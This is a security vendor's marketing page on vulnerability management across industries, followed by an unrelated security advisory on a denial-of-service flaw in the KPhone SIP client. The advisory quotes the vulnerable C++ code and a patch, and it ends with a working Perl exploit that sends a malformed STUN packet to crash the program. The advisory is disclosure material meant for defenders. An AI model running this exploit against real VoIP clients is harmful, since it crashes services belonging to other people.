## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

 KPhone STUN DoS (Malformed STUN Packets)
------------------------------------------------------------------------

Article reference:
<http://www.securiteam.com/unixfocus/5PP0B1FCLY.html>

SUMMARY

<<http://www.wirlab.net/kphone/>> KPhone is "a SIP (Session Initiation Protocol)
user agent for Linux, with which you can initiate VoIP (Voice over IP)
connections over the Internet". KPhone allows its users to enable STUN server
interconnectivity. This interconnectivity allows a remote attacker to crash
the KPhone program by sending it a malformed STUN response packet. The
vulnerability doesn't allow the attacker to execute arbitrary code, but only
to cause a denial of service attack (the program will crash).

DETAILS

Vulnerable Systems:
* KPhone version 4.0.1 and prior

Immune Systems:
* KPhone version 4.0.2 or newer

The vulnerability lies in the fact the size of the received packet is not
verified against its user defined size. The vulnerable code lies at
(sipclient.cpp):
void SipClient::incomingMessage( int socketfd )
..
char inputbuf[ 8000 ];
..
StunMsgHdr* hdr = reinterpret_cast( inputbuf );
..
char* body = inputbuf + sizeof( StunMsgHdr );
unsigned int size = ntohs( hdr->msgLength ); // The size comes from msgLen
..
while( size > 0 ) {
StunAtrHdr* attr = reinterpret_cast( body );
unsigned int hdrLen = ntohs( attr->length );
..
body += hdrLen+4; // The hdrLen comes from the attrLen
size -= hdrLen+4;
}

As attrLen can be set to a bigger value than 8000 (the longest value we can
place in hdrLen is 0xFFFF = 65535), we can cause the body pointer to point to
a memory location outside the scope of our function, thus causing a SEGFAULT.

Patch:
Beyond Security has written a patch that will make sure that the data received
is indeed safe for parsing (verifying all of the msgLen and hdrLen)
356a357,362
>  // check that the size of the header isn't larger than what we've read
>  if ((signed int)sizeof(StunMsgHdr) > bytesread)
>  {
>       printf("Malformed packet (sizeof(StunMsgHdr) > bytesread)\n");
>       return;
>  }
357a364,369
>  // check that the msg length + the hdr length is exactly what we've read
>  if( (signed int)(ntohs(hdr->msgLength) + sizeof(StunMsgHdr)) != bytesread)
>  {
>       printf("Malformed packet (hdr->msgLength + sizeof(StunMsgHdr)) !=
bytesread)\n");
>       return;
>  }
365a378,383
>       // check that our attribute length is not larger than the remaining
size
>       if (hdrLen+4 > size)
>       {
>          printf("Malformed packet (hdrLen+4 > size)\n");
>          return;
>    }

Vendor status:
The vendor has issued a new version 4.0.2, which addresses this issue.

Exploit:
#!/usr/bin/perl
#

use IO::Socket::INET;

my $buf = join("", "\x01\x01", # BindingResponse
  "\x00\x01", # MsgLength
  "A"x16, # GUID
  "\x00\x00", # Attribute
  "\x08\x01", # AttrLength
  "A"x7975 # Value
  );

my $remote = IO::Socket::INET->new( Proto => 'udp',
    PeerAddr => '192.168.1.49',
    PeerPort => 5060);

print $remote $buf;
